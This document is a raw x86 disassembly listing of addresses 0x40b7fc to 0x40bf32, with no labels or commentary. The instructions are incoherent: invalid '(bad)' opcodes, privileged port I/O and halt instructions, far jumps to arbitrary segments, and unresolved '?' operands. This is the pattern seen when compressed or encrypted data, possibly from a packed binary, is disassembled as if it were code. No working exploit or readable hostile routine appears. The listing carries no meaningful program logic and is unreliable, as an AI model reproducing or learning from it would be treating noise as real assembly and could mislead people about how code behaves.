  40b7fc:	lods   eax,DWORD PTR ds:[esi]
  40b7fd:	jmp    0x8842:0x26360303
  40b804:	mov    ebx,0xd776b419
  40b809:	push   edi
  40b80a:	lods   eax,DWORD PTR ds:[esi]
  40b80b:	and    DWORD PTR [ecx+0x56e8ff0],0xffffffc3
  40b812:	and    BYTE PTR [esi+0x436433b6],cl
  40b818:	cmp    dl,ch
  40b81a:	pusha  
  40b81b:	aaa    
  40b81c:	rcl    DWORD PTR [edx-0x31],0x8a
  40b820:	ret    
  40b821:	dec    edx
  40b822:	popf   
  40b823:	jmp    0x40b7a7
  40b825:	arpl   bp,bp
  40b827:	fadd   st,st(1)
  40b829:	pop    ebp
  40b82a:	(bad)  
  40b82b:	jmp    0x40b805
  40b82d:	jb     0x40b87b
  40b82f:	aaa    
  40b830:	inc    edx
  40b831:	ja     0x40b88b
  40b833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b834:	xlat   BYTE PTR ds:[ebx]
  40b835:	jge    0x40b815
  40b837:	xchg   di,ax
  40b839:	call   0x59d688cd
  40b83e:	pushf  
  40b83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b840:	push   ebx
  40b841:	xor    ch,BYTE PTR [ebp+0x57]
  40b844:	call   0x74d2:0xef3e1c32
  40b84b:	fsubr  st(7),st
  40b84d:	mov    BYTE PTR [edx],bh
  40b84f:	mov    ecx,0x4879e32a
  40b854:	jb     0x40b83d
  40b856:	es ins DWORD PTR es:[edi],dx
  40b858:	hlt    
  40b859:	mov    bh,BYTE PTR [ecx-0x5aeacc26]
  40b85f:	xchg   DWORD PTR ds:0xc654001,edx
  40b865:	in     al,0x69
  40b867:	or     dl,bh
  40b869:	cwde   
  40b86a:	mov    edx,0x5bd7ca57
  40b86f:	jmp    0x40b8c5
  40b871:	out    dx,eax
  40b872:	mov    al,ds:0x881a4133
  40b877:	daa    
  40b878:	int3   
  40b879:	mov    gs,WORD PTR gs:[edx-0x16]
  40b87d:	jecxz  0x40b89d
  40b87f:	push   ds
  40b880:	pop    es
  40b881:	ins    DWORD PTR es:[edi],dx
  40b882:	xor    al,0xde
  40b884:	or     dl,BYTE PTR [ebx+0x36]
  40b887:	pop    ebp
  40b888:	retf   
  40b889:	neg    eax
  40b88b:	ror    BYTE PTR [ecx+eiz*8],1
  40b88e:	add    ebx,edi
  40b890:	mov    es,WORD PTR [ecx]
  40b892:	adc    BYTE PTR [ecx],ah
  40b894:	xchg   esi,eax
  40b895:	cmp    al,0xd8
  40b897:	jbe    0x40b837
  40b899:	xchg   DWORD PTR [eax+edx*2-0xe],esp
  40b89d:	hlt    
  40b89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b89f:	pop    edi
  40b8a0:	and    al,0x1
  40b8a2:	scas   al,BYTE PTR es:[edi]
  40b8a3:	pop    edx
  40b8a4:	sub    bh,0xb
  40b8a7:	adc    al,BYTE PTR [edx+0x39]
  40b8aa:	xchg   edi,eax
  40b8ab:	xchg   ebx,eax
  40b8ac:	xor    eax,0x566ffa73
  40b8b1:	xchg   edi,eax
  40b8b2:	xlat   BYTE PTR ds:[ebx]
  40b8b3:	add    BYTE PTR [edi+esi*1],dh
  40b8b6:	cmp    edx,esp
  40b8b8:	dec    edi
  40b8b9:	pusha  
  40b8ba:	dec    ebp
  40b8bb:	ror    ebx,0x2a
  40b8be:	jmp    0x40b887
  40b8c0:	or     BYTE PTR [edi+0x4e],0x7
  40b8c4:	in     eax,0x8a
  40b8c6:	jmp    0x165ccdc7
  40b8cb:	frstpm(287 only) 
  40b8cd:	jb     0x40b890
  40b8cf:	data16 jp 0x40b8e3
  40b8d2:	sbb    bl,BYTE PTR [esi]
  40b8d4:	xchg   ebx,eax
  40b8d5:	(bad)  
  40b8d6:	jmp    0xd1af:0x75be5ddc
  40b8dd:	xor    esp,DWORD PTR [edi+0x76]
  40b8e0:	out    dx,eax
  40b8e1:	mov    BYTE PTR [ecx],bl
  40b8e3:	push   esi
  40b8e4:	push   esi
  40b8e5:	gs push ds
  40b8e7:	sbb    al,0x1a
  40b8e9:	loope  0x40b942
  40b8eb:	jecxz  0x40b8f4
  40b8ed:	xchg   BYTE PTR [edi+0x16],ah
  40b8f0:	push   edi
  40b8f1:	cmp    BYTE PTR [edi-0x4619c892],bl
  40b8f7:	jp     0x40b89f
  40b8f9:	add    ebx,DWORD PTR [ecx+0x2b]
  40b8fc:	pmulhw mm5,QWORD PTR [ebx]
  40b8ff:	jns    0x40b940
  40b901:	ss ins DWORD PTR es:[edi],dx
  40b903:	ins    DWORD PTR es:[edi],dx
  40b904:	xchg   esp,eax
  40b905:	hlt    
  40b906:	mov    cl,0x86
  40b908:	sub    DWORD PTR [esi+ecx*8+0x48],0x28
  40b90d:	popa   
  40b90e:	mov    ebx,0x18d57e90
  40b913:	cwde   
  40b914:	sbb    eax,0x73312aa1
  40b919:	push   ss
  40b91a:	jmp    0x40b98e
  40b91c:	retf   
  40b91d:	push   0x797861d1
  40b922:	add    eax,0x9c41c6a1
  40b927:	stc    
  40b928:	inc    eax
  40b929:	mov    esp,DWORD PTR ds:0xf7a2ae35
  40b92f:	jo     0x40b94a
  40b931:	sub    al,0x27
  40b933:	ret    
  40b934:	mov    bh,BYTE PTR [eax+0x58]
  40b937:	sub    eax,0x544c57e8
  40b93c:	pop    eax
  40b93d:	push   ebp
  40b93e:	nop
  40b93f:	jp     0x40b9a5
  40b941:	mov    WORD PTR [esi],?
  40b943:	(bad)  
  40b944:	mov    edx,esi
  40b946:	dec    ecx
  40b947:	push   esi
  40b948:	push   ss
  40b949:	imul   ebp,DWORD PTR [ebp+0x6c7263ad],0xffffff97
  40b950:	pop    edi
  40b951:	adc    al,0xe8
  40b953:	icebp  
  40b954:	cld    
  40b955:	and    BYTE PTR [ecx-0x4e8f00d3],0x2f
  40b95c:	test   cl,bh
  40b95e:	push   edx
  40b95f:	fdiv   st,st(2)
  40b961:	in     al,0x14
  40b963:	loop   0x40b986
  40b965:	mov    fs,WORD PTR [esi*1+0x65e57178]
  40b96c:	std    
  40b96d:	fdivrp st(7),st
  40b96f:	mov    bl,0x53
  40b971:	bound  ebx,QWORD PTR [ebx]
  40b973:	inc    DWORD PTR [eax-0x4d]
  40b976:	stos   BYTE PTR es:[edi],al
  40b977:	add    eax,0xa1c2b7ce
  40b97c:	or     BYTE PTR [esi-0x4df41d09],cl
  40b982:	sub    al,0x34
  40b984:	out    0x17,eax
  40b986:	jmp    0x40ba00
  40b988:	in     al,dx
  40b989:	je     0x40b96e
  40b98b:	push   cs
  40b98c:	aas    
  40b98d:	mov    eax,0x99b0657a
  40b992:	shr    DWORD PTR [esi-0x39],cl
  40b995:	aaa    
  40b996:	paddsb mm1,mm3
  40b999:	and    DWORD PTR [ebx+0x5c],edx
  40b99c:	cli    
  40b99d:	call   0xc50dcd3b
  40b9a2:	hlt    
  40b9a3:	sbb    DWORD PTR [ebx+0x5902e40a],ebp
  40b9a9:	jmp    0x40b965
  40b9ab:	arpl   WORD PTR [edi+0x7c65191d],di
  40b9b1:	pop    esi
  40b9b2:	pop    ebx
  40b9b3:	xor    edi,DWORD PTR [eax+0x4e157059]
  40b9b9:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40b9bb:	xchg   edi,eax
  40b9bc:	push   ss
  40b9bd:	(bad)  
  40b9bf:	xchg   edx,eax
  40b9c0:	dec    edi
  40b9c1:	and    ch,dh
  40b9c3:	shr    bh,1
  40b9c5:	popf   
  40b9c6:	dec    ebp
  40b9c7:	int3   
  40b9c8:	in     al,dx
  40b9c9:	jns    0x40b99a
  40b9cb:	hlt    
  40b9cc:	mov    dh,0xd5
  40b9ce:	xor    eax,eax
  40b9d0:	pop    edi
  40b9d1:	or     BYTE PTR [edi],0xf1
  40b9d4:	mov    al,0x40
  40b9d6:	out    0x21,al
  40b9d8:	retf   
  40b9d9:	(bad)
  40b9dc:	inc    ecx
  40b9dd:	mov    ds:0x73f9dd5c,eax
  40b9e2:	add    eax,0x6eba3780
  40b9e7:	jmp    0xc81647a5
  40b9ec:	(bad)  
  40b9ed:	adc    BYTE PTR es:[eax+ebx*1+0x10c68d86],cl
  40b9f5:	inc    ebp
  40b9f7:	push   ebx
  40b9f8:	sbb    ebx,DWORD PTR [edi+0x26dbd582]
  40b9fe:	dec    edi
  40b9ff:	mov    cl,0x8c
  40ba01:	int3   
  40ba02:	mov    ch,0xf
  40ba04:	dec    esi
  40ba05:	and    DWORD PTR [ecx],ecx
  40ba07:	std    
  40ba08:	pop    edx
  40ba09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba0a:	stos   DWORD PTR es:[edi],eax
  40ba0b:	pop    edx
  40ba0c:	xor    eax,0xc0f869e9
  40ba11:	inc    edx
  40ba12:	aam    0xd4
  40ba14:	mov    ebp,0x29a24bb5
  40ba19:	data16 (bad) 
  40ba1b:	cwde   
  40ba1c:	and    BYTE PTR [eax],cl
  40ba1e:	xlat   BYTE PTR ds:[ebx]
  40ba1f:	pop    ds
  40ba20:	push   edi
  40ba21:	push   esp
  40ba22:	pop    ebp
  40ba23:	loope  0x40ba8a
  40ba25:	jp     0x40ba37
  40ba27:	pop    esp
  40ba28:	hlt    
  40ba29:	xor    eax,0xc211a608
  40ba2e:	nop
  40ba2f:	(bad)  
  40ba30:	lahf   
  40ba31:	(bad)  
  40ba32:	daa    
  40ba33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba34:	pusha  
  40ba35:	call   0x1522:0xc7f87b4b
  40ba3c:	pop    ebx
  40ba3d:	push   ecx
  40ba3e:	inc    edx
  40ba3f:	mov    esi,DWORD PTR ss:[edx+0x45]
  40ba43:	xor    cl,BYTE PTR [eax]
  40ba45:	jo     0x40b9db
  40ba47:	xchg   esp,eax
  40ba48:	rcr    DWORD PTR [eax],1
  40ba4a:	adc    al,BYTE PTR [ecx]
  40ba4c:	je     0x40baa6
  40ba4e:	mov    ch,dl
  40ba50:	sti    
  40ba51:	nop
  40ba52:	std    
  40ba53:	adc    BYTE PTR [eax+0x62b9a98c],al
  40ba59:	ror    DWORD PTR [edx],cl
  40ba5b:	push   cs
  40ba5c:	xor    eax,0x297ca157
  40ba61:	jmp    0xed00:0x6bf01c83
  40ba68:	sub    BYTE PTR [esi-0x60],ch
  40ba6b:	cli    
  40ba6c:	mov    DWORD PTR [ebp+eax*8-0x6c],eax
  40ba70:	ds loop 0x40baed
  40ba73:	imul   edx,DWORD PTR [esi*4-0x7065eaf3],0xa87bc142
  40ba7e:	mov    edx,0xa412683
  40ba83:	rcr    DWORD PTR [ecx+ecx*2-0x28188940],1
  40ba8a:	adc    DWORD PTR [edi+0x18],0xe2e89d81
  40ba91:	jbe    0x40bae2
  40ba93:	mov    eax,0x742260de
  40ba98:	mov    eax,0x423191b
  40ba9d:	cld    
  40ba9e:	jmp    0x876196d1
  40baa3:	jne    0x40bb0c
  40baa5:	arpl   WORD PTR [ebx-0x70],bx
  40baa8:	js     0x40baa2
  40baaa:	out    0xbb,al
  40baac:	xor    BYTE PTR [eax-0xc],bl
  40baaf:	dec    esp
  40bab0:	fs jmp 0x73476852
  40bab6:	xlat   BYTE PTR ds:[ebx]
  40bab7:	ins    BYTE PTR es:[edi],dx
  40bab8:	pop    es
  40bab9:	jp     0x40bb1e
  40babb:	inc    esp
  40babc:	mov    bl,0xd2
  40babe:	xchg   ebx,eax
  40babf:	imul   eax,DWORD PTR cs:[edx+0x53],0x13
  40bac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bac5:	scas   al,BYTE PTR es:[edi]
  40bac6:	jl     0x40ba49
  40bac8:	mov    esp,0xb0eef9d2
  40bacd:	cmp    al,0x6e
  40bacf:	rcl    DWORD PTR [edx-0x31],0x2d
  40bad3:	call   0xfb4e:0x19e66f04
  40bada:	(bad)  
  40badc:	mov    cl,0x7e
  40bade:	push   cs
  40badf:	outs   dx,DWORD PTR ds:[esi]
  40bae0:	out    0xf8,eax
  40bae2:	sahf   
  40bae3:	push   esp
  40bae4:	test   DWORD PTR [ebx+0x5e],esi
  40bae7:	je     0x40bb43
  40bae9:	mov    eax,ds:0xb5f8e937
  40baee:	adc    al,bh
  40baf0:	repnz sub DWORD PTR [esi],esp
  40baf3:	ins    DWORD PTR es:[edi],dx
  40baf4:	sbb    eax,0xf6f5622b
  40baf9:	iret   
  40bafa:	cmp    esi,esp
  40bafc:	bswap  edx
  40bafe:	fwait
  40baff:	cs push es
  40bb01:	and    BYTE PTR ds:0x34a8a0b0,0x5
  40bb08:	bound  esi,QWORD PTR [esi-0x23dc2a60]
  40bb0e:	cmp    bl,BYTE PTR [edx]
  40bb10:	icebp  
  40bb11:	ds push ds
  40bb13:	or     cl,BYTE PTR [edx+0x2c]
  40bb16:	and    BYTE PTR ds:0x89b4c586,ch
  40bb1c:	or     BYTE PTR [ebx-0x28d718d7],0x5d
  40bb23:	test   eax,0x3c24373
  40bb28:	aaa    
  40bb29:	cdq    
  40bb2a:	push   ss
  40bb2b:	shr    ebx,cl
  40bb2d:	daa    
  40bb2e:	dec    edx
  40bb2f:	es jmp 0x40bae5
  40bb32:	push   edi
  40bb33:	rcl    DWORD PTR [ebx],cl
  40bb35:	sbb    bh,BYTE PTR es:[ebx-0x47dc7f4e]
  40bb3c:	cwde   
  40bb3d:	jecxz  0x40bb29
  40bb3f:	enter  0x6e1,0xe7
  40bb43:	retf   0x44af
  40bb46:	push   ds
  40bb47:	ds scas al,BYTE PTR es:[edi]
  40bb49:	ret    
  40bb4a:	(bad)  
  40bb4b:	fucomip st,st(4)
  40bb4d:	outs   dx,BYTE PTR ds:[esi]
  40bb4e:	inc    ebx
  40bb4f:	mov    al,ds:0x5ce9e6ee
  40bb54:	ins    DWORD PTR es:[edi],dx
  40bb55:	push   0xb
  40bb57:	test   BYTE PTR [ebp+0x14792165],ch
  40bb5d:	adc    eax,0x1638a838
  40bb62:	fcom   QWORD PTR [eax]
  40bb64:	inc    ebp
  40bb65:	lahf   
  40bb66:	xor    bl,BYTE PTR [edx+edi*4]
  40bb69:	sub    eax,0x529dd2d1
  40bb6e:	pop    es
  40bb6f:	retf   0xbbf4
  40bb72:	clc    
  40bb73:	or     esp,DWORD PTR [ebp+0x63]
  40bb76:	data16 sbb cl,BYTE PTR [eax+ecx*1-0x3e]
  40bb7b:	pop    edx
  40bb7c:	repnz add edi,DWORD PTR [ecx+0x1ff1b08a]
  40bb83:	fdiv   DWORD PTR [ecx+ebp*1-0x2a]
  40bb87:	(bad)  
  40bb88:	xor    dl,BYTE PTR ds:0x716b4baf
  40bb8e:	sti    
  40bb8f:	sub    ax,0x5668
  40bb93:	neg    DWORD PTR [ecx]
  40bb95:	push   ds
  40bb96:	test   BYTE PTR [edi+0x33],bl
  40bb99:	les    esp,FWORD PTR [edx-0x49]
  40bb9c:	xchg   BYTE PTR [ecx+ebx*4-0x43],ah
  40bba0:	push   0x2ff5cf9c
  40bba5:	repnz add DWORD PTR [edi-0x64],ebx
  40bba9:	call   0x53278235
  40bbae:	sbb    DWORD PTR [eax-0x4f],esp
  40bbb1:	ret    0x8e3c
  40bbb4:	scas   al,BYTE PTR es:[edi]
  40bbb5:	(bad)  
  40bbb6:	fmul   st,st(6)
  40bbb8:	ss enter 0x9343,0xc5
  40bbbd:	push   esp
  40bbbe:	push   es
  40bbbf:	nop
  40bbc0:	mov    cs,WORD PTR [eax+0x40]
  40bbc3:	mov    DWORD PTR [ebp-0x23],ebp
  40bbc6:	mov    edx,0x3b03938f
  40bbcb:	ja     0x40bb7a
  40bbcd:	ins    BYTE PTR es:[edi],dx
  40bbce:	ret    
  40bbcf:	ret    
  40bbd0:	ret    
  40bbd1:	sub    al,0x1e
  40bbd3:	pop    ss
  40bbd4:	(bad)  
  40bbd5:	push   edi
  40bbd6:	mov    DWORD PTR [edx],ebx
  40bbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbd9:	mov    dl,BYTE PTR [edi]
  40bbdb:	cs retf 0xbcb0
  40bbdf:	mov    fs,WORD PTR [edx+0x19db8a97]
  40bbe5:	dec    esi
  40bbe6:	sub    BYTE PTR [ecx+0x6430fe41],bh
  40bbec:	int    0xa
  40bbee:	ret    0x73d7
  40bbf1:	fwait
  40bbf2:	call   0x299f61ee
  40bbf7:	mov    ds:0x7a17ff01,al
  40bbfc:	aad    0xfe
  40bbfe:	inc    ebp
  40bbff:	jg     0x40bc48
  40bc01:	cdq    
  40bc02:	dec    ebp
  40bc03:	cmp    al,0xd0
  40bc05:	jmp    0x5ea2ac
  40bc0a:	sbb    ecx,DWORD PTR [ebx-0x28]
  40bc0d:	pop    ecx
  40bc0e:	pop    eax
  40bc0f:	cmp    BYTE PTR [ecx-0x10],0x3b
  40bc13:	(bad)  
  40bc14:	shl    edi,1
  40bc16:	jge    0x40bbcc
  40bc18:	or     eax,esp
  40bc1a:	jb     0x40bc6b
  40bc1c:	in     al,dx
  40bc1d:	and    al,0x2b
  40bc1f:	inc    esi
  40bc20:	outs   dx,DWORD PTR ss:[esi]
  40bc22:	loop   0x40bbd7
  40bc24:	push   es
  40bc25:	add    eax,0x47aac202
  40bc2a:	or     bl,BYTE PTR [edx+0x51]
  40bc2d:	sahf   
  40bc2e:	adc    ecx,DWORD PTR [esi+0x15]
  40bc31:	call   0x7056000c
  40bc36:	cdq    
  40bc37:	retf   0xe65f
  40bc3a:	and    cl,cl
  40bc3c:	int    0xac
  40bc3e:	adc    eax,DWORD PTR [edx]
  40bc40:	aad    0x3b
  40bc42:	mov    eax,0x8bbd6a80
  40bc47:	mov    eax,0x3d2415b9
  40bc4c:	pusha  
  40bc4d:	popf   
  40bc4e:	gs push cs
  40bc50:	loop   0x40bc96
  40bc52:	mov    WORD PTR [ecx],?
  40bc54:	xor    DWORD PTR [ecx+esi*2+0xcfe7cd9],ebp
  40bc5b:	xchg   ebp,eax
  40bc5c:	in     al,dx
  40bc5d:	sbb    eax,0x269a02c7
  40bc62:	mov    ecx,0x776bc5ca
  40bc67:	adc    ah,BYTE PTR [edi-0x49f62d27]
  40bc6d:	cli    
  40bc6e:	repz pop ebp
  40bc70:	das    
  40bc71:	inc    ebx
  40bc72:	and    eax,0x8d71ada0
  40bc77:	ds sub al,0x6d
  40bc7a:	pop    edx
  40bc7b:	xor    al,0xb8
  40bc7d:	push   edx
  40bc7e:	aad    0x95
  40bc80:	repz aaa 
  40bc82:	or     al,0x36
  40bc84:	pop    eax
  40bc85:	js     0x40bd03
  40bc87:	jg     0x40bcf3
  40bc89:	mov    DWORD PTR [ecx+0x0],esi
  40bc8c:	mov    esp,0xfbabe748
  40bc91:	or     edx,0xffffff93
  40bc94:	cmp    al,0x21
  40bc96:	aaa    
  40bc97:	lods   eax,DWORD PTR ds:[esi]
  40bc98:	cmc    
  40bc99:	push   edx
  40bc9a:	adc    eax,esi
  40bc9c:	aaa    
  40bc9d:	adc    dl,BYTE PTR [eax]
  40bc9f:	xlat   BYTE PTR ds:[ebx]
  40bca0:	ins    BYTE PTR es:[edi],dx
  40bca1:	into   
  40bca2:	daa    
  40bca3:	inc    esp
  40bca4:	and    BYTE PTR [edi+0x4902d5ca],ah
  40bcaa:	stc    
  40bcab:	es jle 0x40bc45
  40bcae:	xor    al,0xd9
  40bcb0:	test   esp,ebx
  40bcb2:	xchg   edi,eax
  40bcb3:	push   esi
  40bcb4:	push   ebx
  40bcb5:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb7:	ins    BYTE PTR es:[edi],dx
  40bcb8:	iret   
  40bcb9:	adc    DWORD PTR [ebp-0x7deb654f],esp
  40bcbf:	fadd   DWORD PTR [edx+0x7e]
  40bcc2:	das    
  40bcc3:	shr    bl,0x15
  40bcc6:	sar    bl,0x20
  40bcc9:	push   es
  40bcca:	cmp    eax,0x86eb3966
  40bccf:	cli    
  40bcd0:	fcmove st,st(0)
  40bcd2:	push   ecx
  40bcd3:	sub    esi,DWORD PTR [ebp-0x2a1566c9]
  40bcd9:	mov    ecx,0x57e0c0e4
  40bcde:	das    
  40bcdf:	in     eax,dx
  40bce0:	daa    
  40bce1:	mov    al,ds:0x612e63c3
  40bce6:	out    0xdf,eax
  40bce8:	fmul   st,st(5)
  40bcea:	lds    ebp,FWORD PTR [esi-0x7d]
  40bced:	data16 (bad) 
  40bcef:	push   0xc01b8afc
  40bcf4:	push   edx
  40bcf5:	pop    esi
  40bcf6:	lahf   
  40bcf7:	or     esi,DWORD PTR [esi-0x22]
  40bcfa:	xlat   BYTE PTR ds:[ebx]
  40bcfb:	pop    ebp
  40bcfc:	xchg   edx,ecx
  40bcfe:	loopne 0x40bd74
  40bd00:	jnp    0x40bca6
  40bd02:	adc    BYTE PTR [edx],ch
  40bd04:	sbb    eax,0x33b1f1d3
  40bd09:	rcr    DWORD PTR [eax-0x59],0xde
  40bd0d:	je     0x40bcdc
  40bd0f:	and    eax,0x2e90afda
  40bd14:	or     DWORD PTR [eax],esp
  40bd16:	push   edx
  40bd17:	(bad)  
  40bd18:	mov    esi,?
  40bd1a:	mov    dh,0xf
  40bd1c:	mov    bl,0x7c
  40bd1e:	adc    BYTE PTR [edi-0x16],0x36
  40bd22:	mov    bh,0xe5
  40bd24:	cmp    al,ch
  40bd26:	rcr    BYTE PTR [eax+edi*2],0x9e
  40bd2a:	mov    eax,ds:0x19bec99b
  40bd2f:	jbe    0x40bcc2
  40bd31:	xchg   edx,eax
  40bd32:	jno    0x40bd2a
  40bd34:	je     0x40bcf9
  40bd36:	in     al,dx
  40bd37:	xor    BYTE PTR [edi+0x1d],ah
  40bd3a:	lea    esp,[ebx-0x7abd14cc]
  40bd40:	les    edx,FWORD PTR [ecx+0x78]
  40bd43:	(bad)  
  40bd45:	cmp    al,0x1b
  40bd48:	mov    ds:0x8760df1e,al
  40bd4d:	cmp    eax,0x585726cf
  40bd52:	pcmpgtd mm5,QWORD PTR [ecx-0x4a]
  40bd56:	scas   eax,DWORD PTR es:[edi]
  40bd57:	jns    0x40bd2e
  40bd59:	ss xchg ebx,eax
  40bd5b:	popf   
  40bd5c:	pop    edi
  40bd5d:	cmp    edx,ebp
  40bd5f:	in     eax,dx
  40bd60:	xor    DWORD PTR [esi+eax*4],eax
  40bd63:	add    BYTE PTR [edi],cl
  40bd65:	es pop esi
  40bd67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd68:	jle    0x40bd86
  40bd6a:	mov    ebp,0x8e809657
  40bd6f:	jns    0x40bddf
  40bd71:	sub    DWORD PTR [ecx-0xc],ebx
  40bd74:	jo     0x40bd71
  40bd76:	jl     0x40bd74
  40bd78:	icebp  
  40bd79:	imul   esp,DWORD PTR [ebx-0x17],0xb93b3472
  40bd80:	pop    ebp
  40bd81:	add    eax,0xa6075a55
  40bd86:	fidiv  DWORD PTR [ebx-0x4f42494d]
  40bd8c:	fwait
  40bd8d:	pop    esi
  40bd8e:	lahf   
  40bd8f:	jecxz  0x40bdbd
  40bd91:	ffree  st(6)
  40bd93:	mov    ebp,0xad1ad8f1
  40bd98:	dec    edi
  40bd99:	add    ch,BYTE PTR [ecx+0x61]
  40bd9c:	pusha  
  40bd9d:	push   ebx
  40bd9e:	(bad)
  40bda2:	aad    0xb9
  40bda4:	jbe    0x40bd69
  40bda6:	adc    eax,0x303f2c75
  40bdab:	(bad)  
  40bdac:	cmp    bl,BYTE PTR [edi+0x4eb349f3]
  40bdb2:	out    dx,eax
  40bdb3:	mov    edx,ecx
  40bdb5:	push   cs
  40bdb6:	scas   eax,DWORD PTR es:[edi]
  40bdb7:	and    bh,BYTE PTR [edx]
  40bdb9:	dec    BYTE PTR [ebx+edx*8-0x23c52753]
  40bdc0:	xchg   edx,eax
  40bdc1:	xchg   cx,ax
  40bdc3:	push   cs
  40bdc4:	mov    edx,0x819d92c3
  40bdc9:	inc    ebp
  40bdca:	cmp    ecx,0x2f4c3746
  40bdd0:	das    
  40bdd1:	out    dx,eax
  40bdd2:	pop    ebp
  40bdd3:	(bad)  
  40bdd4:	stc    
  40bdd5:	fild   WORD PTR [edi-0x652991a2]
  40bddb:	cld    
  40bddc:	or     bl,BYTE PTR [edi+eax*8+0x751679ef]
  40bde3:	test   al,0x64
  40bde5:	xchg   edi,eax
  40bde6:	dec    edi
  40bde7:	scas   eax,DWORD PTR es:[edi]
  40bde8:	pcmpgtd mm6,QWORD PTR [eax+0x36]
  40bdec:	adc    eax,0x2bf3f372
  40bdf1:	test   BYTE PTR [eax+0x55],0xe3
  40bdf5:	mov    ecx,0x69458bd1
  40bdfa:	push   cs
  40bdfb:	mov    esp,0x64ea6829
  40be00:	aaa    
  40be01:	cmp    eax,0xa6a2ae89
  40be06:	pop    es
  40be07:	mov    edi,DWORD PTR [ecx+0x996b6c]
  40be0d:	shr    ch,1
  40be0f:	adc    ebx,edx
  40be11:	jge    0x40bddf
  40be13:	fstp   DWORD PTR [esi+0x10]
  40be16:	jl     0x40bdbf
  40be18:	lods   eax,DWORD PTR ds:[esi]
  40be19:	xchg   edi,eax
  40be1a:	cdq    
  40be1b:	xor    BYTE PTR [edx+0x64fabe49],cl
  40be21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be23:	sbb    bh,BYTE PTR [eax]
  40be25:	das    
  40be26:	xchg   ebp,eax
  40be27:	cmc    
  40be28:	jmp    0x188f:0x8ced31d0
  40be2f:	bound  ebx,QWORD PTR [edi-0x35]
  40be32:	xchg   ebp,eax
  40be33:	jl     0x40be11
  40be35:	gs inc eax
  40be37:	into   
  40be38:	mov    ch,0xc5
  40be3a:	fld    st(7)
  40be3c:	mov    eax,0x828eeca2
  40be41:	mov    edi,0xb855b95d
  40be46:	jo     0x40be0f
  40be48:	out    dx,eax
  40be49:	adc    dl,bl
  40be4b:	(bad)  [ebp+0x6ba42f1f]
  40be51:	std    
  40be52:	push   esi
  40be53:	jp     0x40bec4
  40be55:	out    0xe7,al
  40be57:	mov    ss,WORD PTR [esi]
  40be59:	inc    eax
  40be5a:	cmp    BYTE PTR [esp+ecx*4-0x2c],0xa
  40be5f:	fisttp QWORD PTR [esi-0x38]
  40be62:	ror    edi,cl
  40be64:	fsubr  QWORD PTR [eax-0x55261830]
  40be6a:	shl    DWORD PTR [ebx+0x7f],cl
  40be6d:	out    0x2d,eax
  40be6f:	mov    esp,esi
  40be71:	jae    0x40be94
  40be73:	fldenv [ebx-0x4eccaf2c]
  40be79:	push   es
  40be7a:	inc    ebx
  40be7b:	std    
  40be7c:	add    eax,0x7354fd9c
  40be81:	bound  ebx,QWORD PTR [eax-0x52ffa2b9]
  40be87:	add    ah,BYTE PTR [eax+0x2b]
  40be8a:	push   edx
  40be8b:	push   ebx
  40be8c:	pop    ds
  40be8d:	sar    BYTE PTR [ebx],0xe
  40be90:	push   ebx
  40be91:	fild   WORD PTR ds:0xa7b083c8
  40be97:	scas   eax,DWORD PTR es:[edi]
  40be98:	pop    edx
  40be99:	xlat   BYTE PTR ds:[ebx]
  40be9a:	jno    0x40be52
  40be9c:	loope  0x40be42
  40be9e:	scas   al,BYTE PTR es:[edi]
  40be9f:	mov    dl,0xb
  40bea1:	pop    es
  40bea2:	dec    ebx
  40bea3:	jae    0x40be78
  40bea5:	push   ecx
  40bea6:	popa   
  40bea7:	add    DWORD PTR [eax+0x47],esp
  40beaa:	jo     0x40be5d
  40beac:	sar    BYTE PTR [edi-0x29],0x7a
  40beb0:	push   edx
  40beb1:	or     edi,DWORD PTR [ebx-0x8]
  40beb4:	out    0xdb,al
  40beb6:	dec    eax
  40beb7:	loope  0x40be69
  40beb9:	(bad)  
  40beba:	bound  ebx,QWORD PTR [eax]
  40bebc:	mov    edx,0x8e7271a6
  40bec1:	sbb    eax,0xf21db02d
  40bec6:	sub    DWORD PTR [esi+ebx*2+0x539ddd42],edx
  40becd:	fcomp  DWORD PTR [edx-0x5]
  40bed0:	imul   ebp,DWORD PTR [ebp+0x78],0xddb189ec
  40bed7:	iret   
  40bed8:	xor    eax,0xf71566f9
  40bedd:	outs   dx,BYTE PTR ds:[esi]
  40bede:	and    al,0xde
  40bee0:	shl    ah,1
  40bee2:	xor    DWORD PTR [ecx+ecx*4],0x5b
  40bee6:	cli    
  40bee7:	sbb    DWORD PTR [eax+0x19],ebx
  40beea:	adc    al,0x3e
  40beec:	sub    eax,0x4fae4879
  40bef1:	loopne 0x40be77
  40bef3:	adc    sp,bp
  40bef6:	jl     0x40bedb
  40bef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bef9:	mov    ds:0x8af51558,eax
  40befe:	xchg   ebx,eax
  40beff:	outs   dx,BYTE PTR ds:[esi]
  40bf00:	jae    0x40beae
  40bf02:	inc    edi
  40bf03:	in     al,dx
  40bf04:	add    al,0x98
  40bf06:	or     BYTE PTR [ebp-0x73bd02a1],ch
  40bf0c:	push   edx
  40bf0d:	push   esp
  40bf0e:	jnp    0x40bee0
  40bf10:	push   ss
  40bf11:	xchg   edx,eax
  40bf12:	push   esi
  40bf13:	adc    eax,0x1a33f416
  40bf18:	xchg   DWORD PTR [edx+0xc],ebp
  40bf1b:	cdq    
  40bf1c:	sbb    ch,BYTE PTR [ecx]
  40bf1e:	aam    0xdd
  40bf20:	xchg   esi,eax
  40bf21:	stos   BYTE PTR es:[edi],al
  40bf22:	push   edi
  40bf23:	mov    ah,0xc2
  40bf26:	pop    ds
  40bf27:	adc    edx,ebx
  40bf29:	ret    0xc8f6
  40bf2c:	(bad)  
  40bf2d:	les    ebx,FWORD PTR [ebp-0x3e]
  40bf30:	add    al,0x6a
  40bf32:	adc    al,ah
